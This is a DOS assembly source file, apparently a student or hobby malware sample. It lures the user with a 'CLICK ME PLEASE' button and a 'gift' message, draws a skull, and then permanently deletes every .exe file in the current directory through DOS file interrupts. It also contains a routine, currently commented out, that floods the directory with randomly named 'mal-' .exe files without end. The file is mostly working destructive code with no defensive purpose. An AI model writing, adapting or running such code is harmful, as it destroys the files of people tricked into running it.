;This code can delete all exe files in the current directory and can create random .exe files infinitely in the same directory
INCLUDE Irvine16.inc

.data
	
	;Start part
	ROW = 13
	COLUMN = 30
	start BYTE "CLICK ME PLEASE",0
	msg BYTE "You have been selected for a gift",0
	;Skull graphics part
	new_cx WORD ?
	new_dx WORD ?
	count1 DWORD ?
	count2 DWORD ?
	thick = 7
	;Delete part
	DTA BYTE 128 DUP(0)		;Disk Transfer Address
	delete_files BYTE "*.exe",0		;* is wildcard for any number of characters, used by 4Eh(find first file) and 4Fh(find next file)
	;Random creator part
	random_file BYTE "mal-",3 DUP(?), ".exe",0
	
.code

	main PROC
		
		mov ax, @data
		mov ds, ax
		
		mov ax, 0000h		;Reset mouse and check mouse
		int 33h				;Interrupt for mouse
		cmp ax, 0000h		;If FFFFh is returned that means mouse driver is intalled
		JE quit

		print_start_and_show_mouse:
			call clrscr
			mov ax, 0001h		;Show cursor on screen
			int 33h
			
			mov dh, ROW
			mov dl, COLUMN
			call gotoxy
			
			mov dx, OFFSET start
			call writestring
			
		mouse_pressed_on_start:	
			mov ax, 0005h			;Check status of a button
			mov bx, 0				;0 for left button, 1 for right button
			int 33h
			
			cmp ax, 1				;If 1 is returned then status of button given in bx is pressed
			JNE mouse_pressed_on_start
			
			cmp cx, COLUMN * 8			;It would be multiplied by 8 if in normal mode
			JNAE mouse_pressed_on_start
				cmp cx, (COLUMN+(LENGTHOF start - 1)) * 8		;It doesn't gives problem,8 is because 
				JNBE mouse_pressed_on_start
					
					cmp dx, ROW * 8
					JNAE mouse_pressed_on_start
						cmp dx, (ROW * 8)+8
						JNBE mouse_pressed_on_start
							
							call clrscr
							mov dh, ROW
							mov dl, COLUMN-10
							call Gotoxy
							mov ax, 10
							call delay
							mov dx, OFFSET msg
							call Writestring
							mov ax, 10000
							call delay
							
							mov ah, 00h			;Initializing graphics
							mov al, 13h			;Setting video mode, 256 colours, 320x200
							int 10h				;Interrupt for graphics
							
							mov al, 00011011b	
							call colour_console_odd_pixels
							mov al, 00010111b
							call colour_console_even_pixels
					
							mov al, 0100b 	;al gets pixel color
							call draw_skull
							
							call search_exe_files_and_delete
							;call generate_random_exe_files
							;jmp quit
							
		;jmp print_start_and_show_mouse		
	
		quit:
		exit
	main ENDP
	;---------------------------------------------------------------------------------------------------
	colour_console_even_pixels PROC
		;Requires video mode to be initiated and al to have binary of a colour
		;Uses si, si, bx, dx, cx, ah registers
		;Colours the whole console in teh given colour
			mov si, 0
			l1: 
				mov di, 0
				l2:
					mov bx, si
					add bx, di
					bt bx, 0
					JC skip
					
					mov dx, si			;dx gets row
					mov cx, di			;cx gets column
					mov ah, 0Ch
					int 10h				;interrupt for graphics
					PUSH ax
					mov ax, 1
					call delay
					POP ax
					skip:
					inc di				;Incrementing column
					cmp di, 320			;In graphics mode there are 320 columns
					JBE l2
				inc si					;Incrementing rows
				cmp si, 200				;In graphics mode there are 200 rows
				JBE l1
			
			ret 
	colour_console_even_pixels ENDP
	;---------------------------------------------------------------------------------------------------
	colour_console_odd_pixels PROC
		;Requires video mode to be initiated and al to have binary of a colour
		;Uses si, si, bx, dx, cx, ah registers
		;Colours the whole console in teh given colour
			mov si, 0
			l1: 
				mov di, 0
				l2:
					mov bx, si
					add bx, di
					bt bx, 0
					JNC skip
					
					mov dx, si			;dx gets row
					mov cx, di			;cx gets column
					mov ah, 0Ch
					int 10h				;interrupt for graphics
					PUSH ax
					mov ax, 1
					call delay
					POP ax
					
					skip:
					inc di				;Incrementing column
					cmp di, 320			;In graphics mode there are 320 columns
					JBE l2
				inc si					;Incrementing rows
				cmp si, 200				;In graphics mode there are 200 rows
				JBE l1
			
			ret 
	colour_console_odd_pixels ENDP	
	;---------------------------------------------------------------------------------------------------
	set_pixel_color PROC
	;Requires video mode to be set,al register to have colour binary, new_cx, and new_dx variables
	;Uses al, cx, dx, ah registers
	;Colours a pixel 
		mov cx, new_cx		;cx gets column
		mov dx, new_dx	 ;dx gets row
		mov ah, 0ch 	;change color for a single pixel
		int 10h 	;set pixel color

	ret
	
	set_pixel_color ENDP
	;---------------------------------------------------------------------------------------------------
	draw_skull PROC
	;Requires new_cx, new_dx, count_1, count_2, thick to be declared in data
	;Uses ecx, cx, dx ah, al registers and the variables
	;Draws the skull in the hardcoded method
		;1st LINE
		mov ecx, thick
		mov new_dx, 20
		L1:
		mov count2, ecx
		mov new_cx, 125
		mov ecx, 50
		
		L2:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L2
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L1

		;2ND LINE
		
		mov ecx, thick
		mov new_dx, 25
		L3:
		mov count2, ecx
		mov new_cx, 120
		mov ecx, 61
		
		L4:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L4
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L3
		
		;3RD LINE
		
		mov ecx, thick
		mov new_dx, 30
		L5:
		mov count2, ecx
		mov new_cx, 115
		mov ecx, 72
		
		L6:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L6
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L5
		
		;4TH LINE
		
		mov ecx, thick
		mov new_dx, 35
		
		L7:
		mov count2, ecx
		mov new_cx, 115
		mov ecx, 7
		
			L8:
			mov count1, ecx
			
			call set_pixel_color
			add new_cx, 1

			mov ecx, count1
			Loop L8
			
		mov new_cx, 140
		mov ecx, 21
			L9:
			mov count1, ecx
			
			call set_pixel_color
			add new_cx, 1
			
			mov ecx, count1
			Loop L9
			
		mov new_cx, 180
		mov ecx, 7
			L10:
			mov count1, ecx
			call set_pixel_color
			add new_cx, 1
			
			mov ecx, count1
			Loop L10	

		add new_dx, 1
		mov ecx, count2
		Loop L7
		
		;5H LINE
		
		mov ecx, thick
		mov new_dx, 40
		
		L11:
		mov count2, ecx
		mov new_cx, 115
		mov ecx, 7
		
			L12:
			mov count1, ecx
			
			call set_pixel_color
			add new_cx, 1

			mov ecx, count1
			Loop L12
			
		mov new_cx, 145
		mov ecx, 10
			L13:
			mov count1, ecx
			
			call set_pixel_color
			add new_cx, 1
			
			mov ecx, count1
			Loop L13
			
		mov new_cx, 180
		mov ecx, 7
			L14:
			mov count1, ecx
			call set_pixel_color
			add new_cx, 1
			
			mov ecx, count1
			Loop L14	

		add new_dx, 1
		mov ecx, count2
		Loop L11
		
		;6TH LINE

		mov ecx, thick
		mov new_dx, 47
		L15:
		mov count2, ecx
		mov new_cx, 115
		mov ecx, 72
		
		L16:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L16
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L15	

		;7TH LINE

		mov ecx, thick
		mov new_dx, 54
		L17:
		mov count2, ecx
		mov new_cx, 120
		mov ecx, 27
		
		L18:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L18
		
		mov new_cx, 155
		mov ecx, 25
		
		L19:
		mov count1, ecx
		call set_pixel_color
		
		add new_cx, 1
		
		mov ecx, count1

		Loop L19
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L17
		
		;8TH LINE
		
		mov ecx, thick
		mov new_dx, 60
		L20:
		mov count2, ecx
		mov new_cx, 125
		mov ecx, 50
		
		L21:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L21
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L20
		
		;9TH LINE 
		
		mov ecx, thick
		mov new_dx, 65
		L22:
		mov count2, ecx
		mov new_cx, 125
		mov ecx, 50
		
		L23:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L23
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L22
		
		;10TH LINE 
		
		mov ecx, 15
		mov new_dx, 70
		L24:
		mov count2, ecx
		mov new_cx, 125
		mov ecx, 10
		
		L25:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L25
		
		mov new_cx, 145
		mov ecx, 10
		
		L26:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L26
		
		mov new_cx, 165
		mov ecx, 10
		
		L27:
		mov count1, ecx
		call set_pixel_color
		add new_cx, 1
		mov ecx, count1

		Loop L27
		
		add new_dx, 1
		
		mov ecx, count2
		Loop L24
		
		ret
	draw_skull ENDP
	;----------------------------------------------------------------------------------------------------
	search_exe_files_and_delete PROC
	;Requires generic pattern for exe files to be declared in files variable
	;Uses dx, ah, cx registers and delete_file function
	;Sets manual DTA defined in .data
	;Searches all of the exe files in the current directory and deletes them
		mov dx, OFFSET DTA
		mov ah, 1Ah     	;Setting Disk Transfer Address to 128 bytes
		int 21h				;DTA is used for 4Eh and 4Fh
	
		mov ah, 4Eh			;Find first file in this case *.exe file, * is wildcard 
		mov cx, 00h			;Attribute is 00h	
		mov dx, OFFSET delete_files 
		int 21h
		JC quit				;If carry is set either File is not found or No more files
		
		mov dx, OFFSET DTA+30	;File name is present at offset 30 of DTA,attribute,time stamps etc are present before offset 30
		call delete_file
		
		search_files:
			mov ah, 4Fh		;Find next file,DTA must point at a data record set up by Find first file interrupt
			mov cx, 00h		;Attribute is 00h read-only
			int 21h
			JC quit			;If carry is set then there aren't any more files ax will have 18	
			
			mov dx, OFFSET DTA+30	;Next file name is at 30 offset of DTA
			call delete_file		;.exe file is already present in dx
			JMP search_files		;Keep searching files
		
		quit:
		ret
	search_exe_files_and_delete ENDP
	;------------------------------------------------------
	delete_file PROC
	;Requires dx to have a filename
	;Uses ah register for interrupt
	;The file is peramnently deleted from computer
		mov ah, 41h
		int 21h			;No need to check Carry Flag for error here
		
		ret
	delete_file ENDP
	;----------------------------------------------------------------------------------------------------
	;Functions for random part
	;----------------------------------------------------------------------------------------------------
	generate_random_exe_files PROC
	;Requires random_file to be created
	;Uses ecx,si,eax,al,dx,bx registers and create_file and close_file functions
	;Generates mal-...exe files infinitely or upto n times
	
		call randomize			;Re-seeds random number generator with current time in hundredths of seconds
		
		;mov ecx, 0
		create_random_exe_file:
			mov si, 4			;Because we need to insert after - in 'mal-' which is 4 index 
			randomize_and_move:
				mov eax, 10
				call RandomRange
				
				or al, 00110000b		;Because moving a number in a string will make it be read as ascii so converting to ascii here
				mov random_file[si], al
				
				inc si
				cmp si, (LENGTHOF random_file) - 5		;-5 is being done here because last five characters are '.exe,0'
				JB randomize_and_move
		
			;mov dx, OFFS-ET random_file
			;call Writestring
			
			mov dx, OFFSET random_file
			call create_file		;Requires dx to have file name
			
			mov bx, ax			;'create_file' moves file handle in ax
			call close_file		;Requires bx to have file handle
			
			JMP create_random_exe_file
	
		ret
	generate_random_exe_files ENDP
	;--------------------------------------------------------------------------------------------------
	create_file PROC
	;Requires dx to have file name
	;Uses ah, cx registers
	;Creates a file
		mov ah, 3Ch			;Interrupt for creating a file
		mov cx, 00h			;Attribute
		int 21h				;If successful then file handle in ax,otherwise Carry Flag is set
							;No need for JC condition here 
		ret
	create_file ENDP
	;--------------------------------------------------------------------------------------------------
	close_file PROC
	;Requires bx to have file handle
	;Uses ah register
	;Closes the file
		mov ah, 3Eh			;Interrupt for closing a file
		int 21h				;No need for JC condition here

		ret
	close_file ENDP
END main